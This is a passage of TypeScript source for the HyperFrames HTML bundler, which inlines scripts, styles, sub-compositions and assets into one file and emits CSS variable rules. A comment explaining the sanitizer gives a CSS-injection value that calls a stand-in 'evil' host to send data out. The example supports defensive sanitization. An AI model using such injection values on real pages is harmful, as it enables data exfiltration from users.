   *   snapshot, and any "ship a single .html file" use case.
   * - `"placeholder"` — emit `<script ... src=""></script>` so the caller can
   *   substitute it with a real URL via string replace. Used by the dev studio
   *   server and vite preview to point at a local runtime endpoint, which keeps
   *   the runtime cacheable across hot-reloads instead of re-inlining ~150 KB
   *   on every change.
   *
   * The `HYPERFRAME_RUNTIME_URL` env var, when set, takes precedence over both
   * modes and emits `<script ... src="<URL>">` directly.
   */
  runtime?: "inline" | "placeholder";
  /**
   * Inline .cube LUTs referenced from data-color-grading. Default: true for
   * self-contained renders/exports. Studio preview disables this so the editor
   * keeps showing project asset paths instead of giant data URLs.
   */
  inlineColorGradingLuts?: boolean;
  /**
   * Inline fonts, raster images (img/href/poster/srcset/CSS url()) and color grading LUTs as data
   * URLs, up to the per-asset size ceiling. Default: true, for a genuinely self-contained bundle. Set
   * false when the caller serves the project's own files alongside the bundle (e.g. a same-origin
   * asset route): assets then keep their authored relative URL, which the caller resolves.
   * `inlineColorGradingLuts` narrows LUTs further; it cannot inline a LUT this option excluded.
   */
  inlineAssets?: boolean;
  /** Preview only: tag each scene's host, styles and scripts (`data-hf-scene`) so one can be swapped. */
  sceneParts?: boolean;
  /** Warn when the compiled HTML breaks the HyperFrames contract (default true). */
  staticGuard?: boolean;
  /** Called once per build for each project file the build reads or looks for. */
  onRead?: (filePath: string) => void;
}

/**
 * Bundle a project's index.html into a single self-contained HTML file.
 *
 * - Compiles timing attributes and optionally resolves media durations
 * - Injects the HyperFrames runtime script
 * - Inlines local CSS and JS files
 * - Inlines sub-composition HTML fragments (data-composition-src)
 * - Inlines textual assets, fonts and raster images as data URLs, up to a
 *   per-asset size limit; audio/video and oversized assets keep their
 *   project-relative URL and require the project directory to be served
 */

type DeferredScriptChunk = string | (() => string);

function preserveLocalScriptIntegrity(
  doc: Document,
  src: string,
  resolvePath: (src: string) => string | null,
): boolean {
  const path = resolvePath(src);
  if (!path) return false;
  const pinned = [...doc.querySelectorAll("script[src][integrity]")].filter((el) => {
    const candidate = el.getAttribute("src") || "";
    return (
      isRelativeUrl(candidate) &&
      resolvePath(candidate) === path &&
      el.getAttribute("integrity")?.trim()
    );
  });
  for (const el of pinned) ensureExternalScriptTag(doc, src, readExternalScriptAttributes(el));
  return pinned.length > 0;
}

function hoistExternalScript(
  src: string,
  projectDir: string,
  doc: Document,
  seenSrcs: Set<string>,
  chunks: DeferredScriptChunk[],
  attributes: ExternalScriptAttributes,
): void {
  if (attributes.integrity?.trim()) {
    ensureExternalScriptTag(doc, src, attributes);
    seenSrcs.add(src);
    return;
  }
  if (seenSrcs.has(src)) return;
  seenSrcs.add(src);
  if (!isNonRelativeUrl(src) && !isAbsolute(src) && attributes.type !== "module") {
    const jsPath = resolveWithinProject(projectDir, decodedUrlPath(src));
    const js = jsPath ? safeReadFile(jsPath) : null;
    if (js != null) {
      chunks.push(() =>
        preserveLocalScriptIntegrity(doc, src, (value) =>
          resolveWithinProject(projectDir, decodedUrlPath(value)),
        )
          ? ""
          : js,
      );
      return;
    }
  }
  ensureExternalScriptTag(doc, src, attributes);
}

function hoistCompositionScripts(
  container: { querySelectorAll: (sel: string) => NodeListOf<Element> },
  opts: {
    projectDir: string;
    document: Document;
    compId: string | null;
    runtimeScope: string | undefined;
    runtimeCompId: string | undefined;
    authoredRootId: string | undefined;
    seenCompScriptSrcs: Set<string>;
    compScriptChunks: DeferredScriptChunk[];
    importMaps: ImportMap[];
    moduleScripts: string[];
  },
): void {
  for (const scriptEl of executableScripts(container)) {
    const externalSrc = (scriptEl.getAttribute("src") || "").trim();
    const type = (scriptEl.getAttribute("type") || "").trim().toLowerCase();
    if (!externalSrc && type === "importmap") {
      const map = parseImportMap(scriptEl.textContent || "", (url) => url);
      if (map) opts.importMaps.push(map);
      else
        console.warn(
          `[HyperFrames] ${opts.compId}: import map is not valid JSON, so it is skipped.`,
        );
    } else if (!externalSrc && type === "module") {
      const prelude = opts.compId ? scopedModulePrelude(opts.runtimeCompId || opts.compId) : "";
      opts.moduleScripts.push(prelude + (scriptEl.textContent || ""));
    } else if (externalSrc) {
      hoistExternalScript(
        externalSrc,
        opts.projectDir,
        opts.document,
        opts.seenCompScriptSrcs,
        opts.compScriptChunks,
        readExternalScriptAttributes(scriptEl),
      );
    } else {
      opts.compScriptChunks.push(
        opts.compId
          ? wrapScopedCompositionScript(
              scriptEl.textContent || "",
              opts.compId,
              "[HyperFrames] composition script error:",
              opts.runtimeScope,
              opts.runtimeCompId || opts.compId,
              opts.authoredRootId,
            )
          : wrapInlineScriptWithErrorBoundary(
              scriptEl.textContent || "",
              "[HyperFrames] composition script error:",
            ),
      );
    }
    scriptEl.remove();
  }
}

export function bundleToSingleHtml(projectDir: string, options?: BundleOptions): Promise<string> {
  const bundle = () => bundleProject(projectDir, options);
  const onRead = options?.onRead;
  if (!onRead) return bundle();
  const noted = new Set<string>();
  const noteOnce = (filePath: string) => {
    if (noted.has(filePath)) return;
    noted.add(filePath);
    onRead(filePath);
  };
  return bundleReads.run(noteOnce, bundle);
}

// A <template> scene has no root or GSAP of its own: bundle it inside the index that mounts it, as render does.
function readMountedSceneShell(
  projectDir: string,
  entryFile: string,
  entryHtml: string,
): string | null {
  if (!isTemplateEntry(entryHtml)) return null;
  const indexHtml = safeReadFile(resolve(projectDir, "index.html"));
  return indexHtml === null
    ? null
    : extractStandaloneEntryFromIndex(indexHtml, entryFile, entryHtml);
}

async function bundleProject(projectDir: string, options?: BundleOptions): Promise<string> {
  const entryFile = options?.entryFile ?? "index.html";
  const indexPath = resolveWithinProject(projectDir, entryFile);
  if (!indexPath || !existsSync(indexPath)) {
    throw new Error(`${entryFile} not found in project directory`);
  }
  noteRead(indexPath);
  const entryHtml = readFileSync(indexPath, "utf-8");
  const mountedShell = readMountedSceneShell(projectDir, entryFile, entryHtml);
  const sourceDir = mountedShell ? projectDir : dirname(indexPath);
  // Every mount of a sub-composition asks again for each of its url()s; isSafePath realpaths the whole chain.
  const safePaths = new Map<string, boolean>();
  const isSafeProjectPath = (resolved: string): boolean => {
    let safe = safePaths.get(resolved);
    if (safe === undefined) {
      safe = isSafePath(projectDir, resolved);
      safePaths.set(resolved, safe);
    }
    return safe;
  };
  const entryPaths = new Map<string, string | null>();
  const resolveEntryPath = (relativePath: string): string | null => {
    let entry = entryPaths.get(relativePath);
    if (entry === undefined) {
      const resolved = resolve(sourceDir, relativePath);
      entry = isSafeProjectPath(resolved) ? resolved : null;
      entryPaths.set(relativePath, entry);
    }
    return entry;
  };
  const resolveProjectPath = (relativePath: string): string | null => {
    const resolved = resolve(projectDir, relativePath);
    return isSafeProjectPath(resolved) ? resolved : null;
  };

  const resolveEntryUrl = (url: string): string | null => resolveEntryPath(decodedUrlPath(url));

  const readSource = options?.stampHfIds ? ensureHfIds : (html: string) => html;
  const rawHtml = readSource(mountedShell ?? entryHtml);
  const compiled = await compileHtml(rawHtml, sourceDir, options?.probeMediaDuration);

  if (options?.staticGuard !== false && !mountedShell) {
    const entryRel = relative(projectDir, indexPath).replace(/\\/g, "/");
    const staticGuard = await validateHyperframeHtmlContract(compiled, {
      dir: projectDir,
      ...(entryRel !== "index.html" && { compSrcPath: entryRel }),
    });
    if (!staticGuard.isValid) {
      console.warn(
        `[StaticGuard] Invalid HyperFrame contract: ${staticGuard.missingKeys.join("; ")}`,
      );
    }
  }

  const withInterceptor = injectInterceptor(compiled, options?.runtime ?? "inline");
  const document = parseHTMLContent(withInterceptor);

  if (resolve(sourceDir) !== resolve(projectDir)) {
    rebaseEntryAuthoredAssetPaths(document, sourceDir, projectDir);
  }

  for (const el of [...document.querySelectorAll('link[rel="stylesheet"]')]) {
    const href = el.getAttribute("href");
    if (!href || !isRelativeUrl(href) || cssStyleMergeKey(el) === undefined) continue;
    if (el.hasAttribute("disabled")) continue;
    const cssPath = resolveEntryUrl(href);
    if (!cssPath) continue;
    const css = safeReadFile(cssPath);
    if (css == null) continue;
    const style = document.createElement("style");
    for (const name of ["media", "title"]) {
      const value = el.getAttribute(name);
      if (value !== null) style.setAttribute(name, value);
    }
    style.textContent = inlineCssFile(css, dirname(cssPath), projectDir, new Set([cssPath]));
    el.replaceWith(style);
  }

  // Read before sub-compositions add theirs: only the root's own scripts can reach into scenes.
  const rootScripts = options?.sceneParts
    ? [
        ...document.querySelectorAll(`script:not([${RUNTIME_BOOTSTRAP_ATTR}])`),
        ...[...document.querySelectorAll("template")].flatMap((t) => [
          ...(t as HTMLTemplateElement).content.querySelectorAll("script"),
        ]),
      ].map((el) => {
        const src = el.getAttribute("src");
        const path = src && isRelativeUrl(src) ? resolveEntryUrl(src) : null;
        const text = src ? (path && safeReadFile(path)) || "" : el.textContent || "";
        return isLibraryCopy(text) ? "" : text;
      })
    : [];

  // Inline sub-compositions (via shared function)
  const trackedCompositionHosts = getBundledTrackedCompositionHosts(document);
  const hostIdentityByElement = assignBundledRuntimeCompositionIds(trackedCompositionHosts);
  const subCompositionHosts = trackedCompositionHosts.filter((host) =>
    host.hasAttribute("data-composition-src"),
  );
  const sceneSources = new Map<string, string | null>();
  const subCompResult = inlineSubCompositions(document, subCompositionHosts, {
    resolveHtml: (srcPath: string) => {
      if (!isRelativeUrl(srcPath)) return null;
      const compPath = resolveEntryPath(srcPath);
      if (!compPath) return null;
      let source = sceneSources.get(compPath);
      if (source === undefined) {
        const html = safeReadFile(compPath);
        source = html === null ? null : readSource(html);
        sceneSources.set(compPath, source);
      } else {
        noteRead(compPath);
      }
      return source;
    },
    parseHtml: parseHTMLContent,
    hostIdentityMap: hostIdentityByElement,
    rewriteInlineStyles: true,
    // A sub-composition's SIBLING assets (a stylesheet next to it) must be
    // re-pointed at its own directory when its content moves to the root
    // document; project-root refs with no such sibling stay as authored.
    assetExists: (path: string) => {
      const resolved = resolveEntryPath(path);
      if (resolved) noteRead(resolved);
      return resolved !== null && existsSync(resolved);
    },
    flattenInnerRoot: prepareFlattenedInnerRoot,
    tagScenes: options?.sceneParts === true,
    readProjectScript: (path: string) => {
      const resolved = isRelativeUrl(path) ? resolveEntryUrl(path) : null;
      return resolved ? safeReadFile(resolved) : null;
    },
    readVariableDefaults: readDeclaredDefaults,
    parseHostVariables: parseHostVariableValues,
    buildScopeSelector: (compId: string) => cssAttributeSelector("data-composition-id", compId),
    scriptErrorLabel: "[HyperFrames] composition script error:",
    onMissingComposition: (srcPath: string, reason?: string) => {
      console.warn(
        `[Bundler] Skipping sub-composition "${srcPath}": ${reason ?? "the file could not be found"}.`,
      );
    },
  });
  refuseSwapsReachedByRootScripts(document, rootScripts);
  const styleRuns: PartRun<CompositionStyle>[] = [];
  subCompResult.styles.forEach((style, i) =>
    pushRun(styleRuns, subCompResult.styleScenes[i], style),
  );
  const scriptRuns: PartRun<DeferredScriptChunk>[] = [];
  const compStyleChunks: CompositionStyle[] = [];
  const compScriptChunks: DeferredScriptChunk[] = [];
  const compExternalLinks = [...subCompResult.externalLinks];
  const compVariablesByComp: Record<string, Record<string, unknown>> = {
    ...subCompResult.variablesByComp,
  };
  const seenCompScriptSrcs = new Set<string>();
  const scenesBySrc = new Map<string, Set<string | undefined>>();
  for (const item of subCompResult.scriptItems)
    if (item.kind !== "inline")
      scenesBySrc.set(item.src, (scenesBySrc.get(item.src) ?? new Set()).add(item.scene));
  for (const scriptItem of subCompResult.scriptItems) {
    if (scriptItem.kind === "inline") {
      pushRun(scriptRuns, scriptItem.scene, scriptItem.content);
      continue;
    }
    const extSrc = scriptItem.src;
    if (scriptItem.integrity?.trim()) {
      ensureExternalScriptTag(document, extSrc, scriptItem);
      seenCompScriptSrcs.add(extSrc);
      continue;
    }
    if (seenCompScriptSrcs.has(extSrc)) continue;
    seenCompScriptSrcs.add(extSrc);
    // Run once for the film when scenes share it: a scene mounts without the one that loaded it first.
    const scene = (scenesBySrc.get(extSrc)?.size ?? 0) > 1 ? undefined : scriptItem.scene;
    if (isRelativeUrl(extSrc) && scriptItem.type !== "module") {
      const jsPath = resolveEntryUrl(extSrc);
      const js = jsPath ? safeReadFile(jsPath) : null;
      if (js != null) {
        const chunk = () =>
          preserveLocalScriptIntegrity(document, extSrc, resolveEntryUrl) ? "" : js;
        pushRun(scriptRuns, scene, chunk);
        continue;
      }
    }
    ensureExternalScriptTag(document, extSrc, scriptItem);
  }

  // Inline template compositions: inject <template id="X-template"> content into
  // matching empty host elements with data-composition-id="X" (no data-composition-src)
  const candidateInlineHosts = trackedCompositionHosts.filter(
    (host) => !host.hasAttribute("data-composition-src"),
  );
  for (const templateEl of [...document.querySelectorAll("template[id]")]) {
    const templateId = templateEl.getAttribute("id") || "";
    const match = templateId.match(/^(.+)-template$/);
    if (!match) continue;
    const compId = match[1];
    if (!compId) continue;

    const hosts = candidateInlineHosts.filter(
      (host) =>
        hostIdentityByElement.get(host)?.authoredCompositionId === compId &&
        host.children.length === 0,
    );
    if (hosts.length === 0) continue;

    const templateHtml = templateEl.innerHTML || "";

    for (const host of hosts) {
      const hostIdentity = hostIdentityByElement.get(host);
      const runtimeCompId = hostIdentity?.runtimeCompositionId || compId;
      const innerDoc = parseHTMLContent(templateHtml);
      const plan = planCompositionAssembly<Element>({
        contentNode: innerDoc,
        hasTemplate: true,
        compositionId: compId,
      });
      const { innerRoot, authoredRootId } = plan;
      const runtimeScope = runtimeCompId
        ? cssAttributeSelector("data-composition-id", runtimeCompId)
        : "";
      const mergedVariables = runtimeCompId ? parseHostVariableValues(host) : {};
      if (runtimeCompId && Object.keys(mergedVariables).length > 0) {
        compVariablesByComp[runtimeCompId] = mergedVariables;
      }
      // Same defect on the <template> mount as on the data-composition-src
      // mount (see inlineSubCompositions): the merged instance values are
      // baked in here, so only compile time can see a value that falls back.
      if (runtimeCompId) {
        warnUnknownEnumValues(innerDoc.documentElement, mergedVariables, runtimeCompId);
        warnUnknownEnumValues(innerRoot, mergedVariables, runtimeCompId);
      }
      pushSubCompVariableStyles(
        innerDoc,
        innerRoot,
        mergedVariables,
        runtimeScope,
        compStyleChunks,
      );

      if (innerRoot) {
        // Hoist styles into the collected style chunks
        for (const styleEl of [...innerRoot.querySelectorAll("style")]) {
          if (cssStyleMergeKey(styleEl) === undefined) continue;
          const css = styleEl.textContent || "";
          compStyleChunks.push(
            compositionStyle(
              styleEl,
              compId
                ? scopeCssToComposition(css, compId, runtimeScope, authoredRootId, {
                    scopeRootSelectors: true,
                  })
                : css,
            ),
          );
          styleEl.remove();
        }
        hoistCompositionScripts(innerRoot, {
          projectDir,
          document,
          compId,
          runtimeScope,
          runtimeCompId,
          authoredRootId: authoredRootId ?? undefined,
          seenCompScriptSrcs,
          compScriptChunks,
          importMaps: subCompResult.importMaps,
          moduleScripts: subCompResult.moduleScripts,
        });

        // Copy dimension attributes from inner root to host if not already set
        const innerW = innerRoot.getAttribute("data-width");
        const innerH = innerRoot.getAttribute("data-height");
        if (innerW && !host.getAttribute("data-width")) host.setAttribute("data-width", innerW);
        if (innerH && !host.getAttribute("data-height")) host.setAttribute("data-height", innerH);
        const preparedInnerRoot = prepareFlattenedInnerRoot(innerRoot);
        host.innerHTML = preparedInnerRoot.outerHTML || "";
      } else {
        // No matching inner root — inject all template content directly
        for (const styleEl of [...innerDoc.querySelectorAll("style")]) {
          if (cssStyleMergeKey(styleEl) === undefined) continue;
          const css = styleEl.textContent || "";
          compStyleChunks.push(
            compositionStyle(
              styleEl,
              compId
                ? scopeCssToComposition(css, compId, runtimeScope, undefined, {
                    scopeRootSelectors: true,
                  })
                : css,
            ),
          );
          styleEl.remove();
        }
        hoistCompositionScripts(innerDoc, {
          projectDir,
          document,
          compId,
          runtimeScope,
          runtimeCompId,
          authoredRootId: undefined,
          seenCompScriptSrcs,
          compScriptChunks,
          importMaps: subCompResult.importMaps,
          moduleScripts: subCompResult.moduleScripts,
        });

        host.innerHTML = innerDoc.body.innerHTML || "";
      }
      for (const el of plan.inertScriptsOutsideRoot)
        host.insertAdjacentHTML("beforeend", el.outerHTML);
    }

    // Remove the template element from the document
    templateEl.remove();
  }

  for (const el of [...document.querySelectorAll("script[src]")]) {
    const src = el.getAttribute("src");
    if (!src || !isRelativeUrl(src)) continue;
    if (preserveLocalScriptIntegrity(document, src, resolveEntryUrl)) continue;
    // Module scripts can contain static imports whose resolution is relative
    // to the script URL. Folding their source into a classic inline script
    // both drops module semantics and changes the import base URL.
    if ((el.getAttribute("type") || "").trim().toLowerCase() === "module") continue;
    const jsPath = resolveEntryUrl(src);
    const js = jsPath ? safeReadFile(jsPath) : null;
    if (js == null) continue;
    el.setAttribute(INLINED_FILE_ATTR, src);
    el.removeAttribute("src");
    el.textContent = js;
  }

  for (const link of compExternalLinks) ensureExternalLinkTag(document, link);

  for (const css of compStyleChunks) pushRun(styleRuns, undefined, css);
  for (const chunk of compScriptChunks) pushRun(scriptRuns, undefined, chunk);
  emitVariablesByCompScript(document, compVariablesByComp);
  for (const { scene, chunks } of styleRuns) {
    const join = scene ? joinCssHoistingImports : (css: string[]) => css.join("\n\n");
    for (const style of styleElementsFor(document, chunks, join)) {
      if (scene) style.setAttribute(SCENE_PART_ATTR, scene);
      document.head.appendChild(style);
    }
  }
  for (const { scene, chunks } of scriptRuns) {
    const texts = chunks.map((chunk) => (typeof chunk === "string" ? chunk : chunk()));
    const joined = joinJsChunks(texts);
    const skipsRunMerge = Boolean(scene);
    for (const text of parsesAsScript(joined) ? [joined] : texts.filter(Boolean)) {
      const script = document.createElement("script");
      if (scene) script.setAttribute(SCENE_PART_ATTR, scene);
      script.textContent = skipsRunMerge
        ? await inlineScriptSource(text, options?.scriptProvenance)
        : text;
      document.body.appendChild(script);
    }
  }
  emitMountedModuleScripts(document, subCompResult.importMaps, subCompResult.moduleScripts);

  emitRootCompositionVariableStyles(document, compVariablesByComp);

  enforceCompositionPixelSizing(document);
  autoHealMissingCompositionIds(document);
  await coalesceHeadStylesAndBodyScripts(document, options?.scriptProvenance);
  for (const el of document.querySelectorAll(`script[${INLINED_FILE_ATTR}]`)) {
    const js = el.textContent ?? "";
    el.textContent = escapeInlineScriptSource(
      isJavaScriptType(el) ? await stripJsCommentsParserSafe(js, options?.scriptProvenance) : js,
    );
  }
  deferScriptsUntilFonts(document, (el) => el.hasAttribute(RUNTIME_BOOTSTRAP_ATTR));
  injectTextRenderingRule(document);

  // Inline textual assets
  const inlineAssets = options?.inlineAssets !== false;
  const inlineAsset = createAssetInliner(resolveProjectPath, inlineAssets);
  for (const el of [...document.querySelectorAll("[src], [href], [poster], [xlink\\:href]")]) {
    for (const attr of ["src", "href", "poster", "xlink:href"] as const) {
      const value = el.getAttribute(attr);
      if (!value) continue;
      // Chromium requires external SVG <use> fragments to be same-origin with
      // the document. Converting the sprite to a data: URL makes it an opaque
      // origin and triggers "Unsafe attempt to load URL ... from frame".
      // Keep the project-relative URL; render/check servers already expose it.
      if (isExternalSvgFragmentUse(el, attr, value)) continue;
      const inlined = inlineAsset(value);
      if (inlined) el.setAttribute(attr, inlined);
    }
  }
  for (const el of [...document.querySelectorAll("[srcset]")]) {
    const srcset = el.getAttribute("srcset");
    if (srcset)
      el.setAttribute(
        "srcset",
        rewriteSrcsetUrls(srcset, (url) => inlineAsset(url) ?? url),
      );
  }
  // Before inlining, so postcss reads paths not font bytes.
  const liveStyles = [...document.querySelectorAll("style")].filter(isAlwaysAppliedStyle);
  const liveCss = liveStyles.map((el) => el.textContent || "");
  const { styles, faces } = options?.sceneParts
    ? hoistFontFaceRules(liveCss)
    : { styles: dedupeFontFaceRules(liveCss), faces: [] };
  liveStyles.forEach((el, i) => {
    el.textContent = styles[i] ?? "";
  });
  if (faces.length > 0) {
    const holder = document.createElement("style");
    holder.setAttribute(SCENE_FONTS_ATTR, "");
    holder.textContent = faces.join("\n");
    document.head.prepend(holder);
  }
  for (const styleEl of document.querySelectorAll("style")) {
    styleEl.textContent = rewriteCssUrlsWithInlinedAssets(styleEl.textContent || "", inlineAsset);
  }
  for (const el of [...document.querySelectorAll("[style]")]) {
    el.setAttribute(
      "style",
      rewriteCssUrlsWithInlinedAssets(el.getAttribute("style") || "", inlineAsset),
    );
  }
  if (inlineAssets && options?.inlineColorGradingLuts !== false) {
    for (const el of [...document.querySelectorAll(`[${HF_COLOR_GRADING_ATTR}]`)]) {
      const value = el.getAttribute(HF_COLOR_GRADING_ATTR);
      if (value) {
        el.setAttribute(
          HF_COLOR_GRADING_ATTR,
          rewriteColorGradingLutWithInlinedAssets(value, inlineAsset),
        );
      }
    }
  }

  assignMediaRenderIds(document);
  return document.toString();
}

/**
 * Make a scalar variable value safe to bake into a stylesheet.
 *
 * Two independent hazards, so two layers:
 *
 * 1. `sanitizeCssValue` is the runtime's own contract (`applyVariableBindings`,
 *    and `docs/concepts/variables.mdx` promises it): a scalar folded into
 *    `background: var(--x)` must not be able to close the declaration and open a
 *    new rule (`red; } body { background-image: url(//evil?data=…) }`). The
 *    compile path has to reach the same result as the runtime — a value the
 *    runtime strips but a compile-time emit honours would make the rendered MP4
 *    diverge from the preview.
 * 2. These rules are then serialized inside a `<style>` element, which is a RAW
 *    TEXT element: HTML serialization does not escape its content and the
 *    tokenizer ends it at the first `</style`. `\3c ` is the CSS escape for `<`,
 *    valid in every value position including inside an unquoted `url()`, and
 *    resolves back to `<`, so rendering is unchanged. The trailing space is
 *    consumed as part of the escape.
 *
 * The sanitizer already removes `<`, so today layer 2 is redundant for values
 * and load-bearing only for the selector (`cssAttributeSelector`, which must
 * preserve `<` to keep matching). It stays because the two layers answer to
 * different rules: narrowing the scalar character set must not silently reopen
 * an element-termination hole.
 *
 * Variable IDs need no equivalent: `cssVariableName` slugifies them.
 */
function cssSafeVariableValue(value: string | number): string {
  return sanitizeCssValue(String(value)).replace(/</g, "\\3c ");
}

/** One stylesheet rule defining primitive composition variables under `selector`. */
function compositionVariablesCssBlock(
  variables: Record<string, unknown>,
  selector: string,
): string | null {
  const lines: string[] = [];
  for (const [id, value] of Object.entries(variables)) {
    if ((typeof value === "string" && value !== "") || typeof value === "number") {
      lines.push(`  ${cssVariableName(id)}: ${cssSafeVariableValue(value)};`);
    }
  }
  if (lines.length === 0) return null;
  return `${selector} {\n${lines.join("\n")}\n}`;
}

/**
 * Compile-time counterpart of the runtime's injectCompositionCssVariables:
 * every element declaring data-composition-variables gets a scoped stylesheet
 * rule so var(--slug, literal) references resolve during body parse. The
 * runtime injection remains define-if-absent, so it won't double-apply.
 *
 * `variablesByComp` (host-merged sub-composition values, keyed by runtime
 * composition id) adds one rule per scope — the flattened inner root loses
 * its data-composition-id, so the host selector is the only stable anchor.
 * Exported for the producer's render compiler, which inlines sub-compositions
 * through the shared module rather than this bundler.
 * Returns whether a style element was appended.
 */
export function emitRootCompositionVariableStyles(
  document: Document,
  variablesByComp: Record<string, Record<string, unknown>> = {},
  overrides: Record<string, unknown> = {},
): boolean {
  const authoredDefines = authoredDefinesPredicate(document);
  const layerFor = makeVariableLayer(authoredDefines, overrides);
  const rules = [
    ...hostScopedVariableRules(variablesByComp, overrides, authoredDefines),
    ...rootDeclaredVariableRules(document, layerFor),
    ...declarerVariableRules(document, layerFor),
  ];
  if (rules.length === 0) return false;
  const style = document.createElement("style");
  style.setAttribute("data-hf-composition-variables", "");
  style.textContent = rules.join("\n\n");
  document.head.appendChild(style);
  return true;
}

type VariableLayer = (
  declared: Record<string, unknown>,
  hostValues: Record<string, unknown>,
) => Record<string, unknown>;

function authoredDefinesPredicate(document: Document): (id: string) => boolean {
  const authoredCss = [...document.querySelectorAll("style:not([data-hf-composition-variables])")]
    .map((s) => s.textContent || "")
    .join("\n");
  const defined = namesBeforeAColon(authoredCss);
  return (id) => defined.has(cssVariableName(id));
}

/** Every `--name` written right before a `:`, including the tail of a longer word (`.a--b:hover`), in one pass. */
function namesBeforeAColon(css: string): Set<string> {
  const names = new Set<string>();
  const word = /[\w-]+/g;
  const colonNext = /\s*:/y;
  for (let match = word.exec(css); match; match = word.exec(css)) {
    colonNext.lastIndex = word.lastIndex;
    if (!colonNext.test(css)) continue;
    const text = match[0];
    for (let at = text.indexOf("--"); at !== -1; at = text.indexOf("--", at + 1))
      names.add(text.slice(at));
  }
  return names;
}

/**
 * Layering for one declarer: authored stylesheet definitions win over
 * declared defaults (the runtime's define-if-absent, applied statically) —
 * a var already defined in any authored <style> block is not emitted. Host
 * values and --variables overrides are explicit intent, never filtered.
 */
function makeVariableLayer(
  authoredDefines: (id: string) => boolean,
  overrides: Record<string, unknown>,
): VariableLayer {
  return (declared, hostValues) => {
    const out: Record<string, unknown> = {};
    for (const [id, value] of Object.entries(declared)) {
      if (!authoredDefines(id)) out[id] = value;
    }
    for (const [id, value] of Object.entries(hostValues)) {
      if (id in declared) out[id] = value;
    }
    for (const [id, value] of Object.entries(overrides)) {
      if (id in declared || id in hostValues) out[id] = value;
    }
    return out;
  };
}

/**
 * Host-scoped rules: per-instance values inherited by the host's subtree.
 * A composition variable, whether a declared default or an explicit
 * data-variable-values value, never redefines a custom property authored by
 * another part of the document. Render-time --variables overrides remain
 * explicit user intent and always win.
 */
function hostScopedVariableRules(
  variablesByComp: Record<string, Record<string, unknown>>,
  overrides: Record<string, unknown>,
  authoredDefines: (id: string) => boolean,
): string[] {
  const rules: string[] = [];
  for (const [compId, vars] of Object.entries(variablesByComp)) {
    const withOverrides: Record<string, unknown> = {};
    for (const [id, value] of Object.entries(vars)) {
      if (!authoredDefines(id)) withOverrides[id] = value;
    }
    for (const [id, value] of Object.entries(overrides)) {
      if (id in vars) withOverrides[id] = value;
    }
    const rule = compositionVariablesCssBlock(
      withOverrides,
      cssAttributeSelector("data-composition-id", compId),
    );
    if (rule) rules.push(rule);
  }
  return rules;
}

function rootDeclaredVariableRules(document: Document, layerFor: VariableLayer): string[] {
  const htmlDeclared = readDeclaredDefaults(document.documentElement);
  const htmlRule = compositionVariablesCssBlock(layerFor(htmlDeclared, {}), ":root");
  return htmlRule ? [htmlRule] : [];
}

/**
 * Declarer rules anchor on a per-instance marker attribute, not the
 * composition id: two inlined instances of one sub-composition share a
 * data-composition-id, and a shared selector would let instance A's rule
 * restyle instance B. The nearest ancestor host's data-variable-values
 * layer over the declared defaults (mirrors the runtime loader).
 */
function declarerVariableRules(document: Document, layerFor: VariableLayer): string[] {
  const rules: string[] = [];
  let markerSeq = 0;
  for (const el of [...document.querySelectorAll("[data-composition-variables]")]) {
    const declared = readDeclaredDefaults(el);
    const hostEl =
      typeof el.closest === "function" ? el.parentElement?.closest("[data-variable-values]") : null;
    const hostValues = hostEl ? parseHostVariableValues(hostEl) : {};
    const vars = layerFor(declared, hostValues);
    if (Object.keys(vars).length === 0) continue;
    markerSeq += 1;
    el.setAttribute("data-hf-var-scope", String(markerSeq));
    const rule = compositionVariablesCssBlock(vars, `[data-hf-var-scope="${markerSeq}"]`);
    if (rule) rules.push(rule);
  }
  return rules;
}

/**
 * Compile-time CSS custom properties for a sub-comp scope: declared defaults
 * layered under per-instance host values, emitted as a stylesheet rule on the
 * host selector. A stylesheet in <head> is in effect while the body parses,
 * so eval-time reads (GSAP .from immediateRender, canvas tinting) see the
 * right values — the runtime's DOMContentLoaded injection is too late for
 * those on compiled pages.
 */
function pushSubCompVariableStyles(
  innerDoc: Document,
  innerRoot: Element | null,
  mergedVariables: Record<string, unknown>,
  runtimeScope: string,
  compStyleChunks: CompositionStyle[],
): void {
  if (!runtimeScope) return;
  const declaredForCss = readDeclaredDefaults(innerDoc.documentElement);
  const innerRootForVars = innerRoot ?? innerDoc.querySelector("[data-composition-variables]");
  if (innerRootForVars) Object.assign(declaredForCss, readDeclaredDefaults(innerRootForVars));
  const cssVars = compositionVariablesCssBlock(
    { ...declaredForCss, ...mergedVariables },
    runtimeScope,
  );
  if (cssVars) compStyleChunks.push({ css: cssVars, media: null, title: null });
}
